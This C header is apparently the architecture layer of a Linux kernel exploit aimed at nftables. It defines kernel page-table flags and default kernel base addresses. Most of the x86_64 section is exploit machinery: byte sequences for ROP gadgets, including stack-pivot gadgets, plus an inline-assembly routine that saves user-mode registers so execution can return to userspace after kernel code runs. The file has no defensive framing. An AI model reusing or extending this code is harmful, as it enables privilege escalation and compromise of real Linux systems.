#ifndef ARCH_H
#define ARCH_H

#include <stdint.h>

#if defined(__x86_64__) || defined(__amd64__)

#define ARCH_X86_64   1
#define ARCH_NAME     "x86_64"

#define PAGE_SHIFT    12
#define PAGE_SZ       (1UL << PAGE_SHIFT)
#define PAGE_MASK     (~(PAGE_SZ - 1))
#define PMD_SHIFT     21
#define PMD_SZ        (1UL << PMD_SHIFT)
#define PUD_SHIFT     30
#define PGD_SHIFT     39

#define _PAGE_PRESENT  (1UL << 0)
#define _PAGE_RW       (1UL << 1)
#define _PAGE_USER     (1UL << 2)
#define _PAGE_PWT      (1UL << 3)
#define _PAGE_PCD      (1UL << 4)
#define _PAGE_ACCESSED (1UL << 5)
#define _PAGE_DIRTY    (1UL << 6)
#define _PAGE_PSE      (1UL << 7)
#define _PAGE_GLOBAL   (1UL << 8)
#define _PAGE_NX       (1UL << 63)

#define PTE_PFN_MASK   0x000FFFFFFFFFF000ULL

#define PHYSMAP_BASE_DEFAULT  0xffff888000000000ULL
#define KTEXT_BASE_DEFAULT    0xffffffff81000000ULL
#define MODULES_BASE_DEFAULT  0xffffffffa0000000ULL

/* x86_64 ROP gadget byte sequences */
#define GADGET_POP_RDI_RET         "\x5f\xc3"
#define GADGET_POP_RSI_RET         "\x5e\xc3"
#define GADGET_POP_RDX_RET         "\x5a\xc3"
#define GADGET_POP_RCX_RET         "\x59\xc3"
#define GADGET_POP_RAX_RET         "\x58\xc3"
#define GADGET_POP_R8_RET          "\x41\x58\xc3"
#define GADGET_RET                 "\xc3"
#define GADGET_XCHG_RAX_RSP_RET   "\x48\x94\xc3"
#define GADGET_PUSH_RAX_POP_RSP   "\x50\x5c\xc3"
#define GADGET_MOV_RDI_RAX_CALL_RDX "\x48\x89\xc7\xff\xd2"

#define GADGET_POP_RDI_RET_LEN          2
#define GADGET_POP_RSI_RET_LEN          2
#define GADGET_POP_RDX_RET_LEN          2
#define GADGET_POP_RCX_RET_LEN          2
#define GADGET_POP_RAX_RET_LEN          2
#define GADGET_POP_R8_RET_LEN           3
#define GADGET_RET_LEN                  1
#define GADGET_XCHG_RAX_RSP_RET_LEN    3
#define GADGET_PUSH_RAX_POP_RSP_LEN    3
#define GADGET_MOV_RDI_RAX_CALL_RDX_LEN 5

/* userspace register state saved before entering kernel */
struct user_regs_save {
    uint64_t cs;
    uint64_t ss;
    uint64_t rsp;
    uint64_t rflags;
    uint64_t rip;
};

static inline void save_user_regs(struct user_regs_save *r)
{
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushfq\n"
        "pop %3\n"
        : "=r"(r->cs), "=r"(r->ss), "=r"(r->rsp), "=r"(r->rflags)
    );
}

#elif defined(__aarch64__)

#define ARCH_AARCH64  1
#define ARCH_NAME     "aarch64"
#define PAGE_SHIFT    12
#define PAGE_SZ       (1UL << PAGE_SHIFT)
#define PAGE_MASK     (~(PAGE_SZ - 1))
#define PHYSMAP_BASE_DEFAULT  0xffff000000000000ULL
#define KTEXT_BASE_DEFAULT    0xffff800010000000ULL

#else
#error "Unsupported architecture -- NFTtables needs x86_64 or aarch64"
#endif

#endif
